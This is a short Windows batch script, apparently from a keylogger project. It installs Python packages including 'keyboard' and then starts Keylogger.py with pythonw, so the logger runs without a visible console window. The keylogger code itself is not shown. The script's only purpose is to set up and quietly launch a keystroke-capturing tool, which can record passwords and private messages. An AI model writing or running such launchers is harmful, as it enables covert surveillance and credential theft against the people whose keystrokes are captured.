@echo off
echo Installing/upgrading pip...
py -m pip install --upgrade pip

echo Installing keyboard...
pip install keyboard

echo Installing logging...
pip install logging

echo Installing requirements...
pip install -r requirements.txt

echo Running Keylogger.py...
start pythonw Keylogger.py

echo Done!
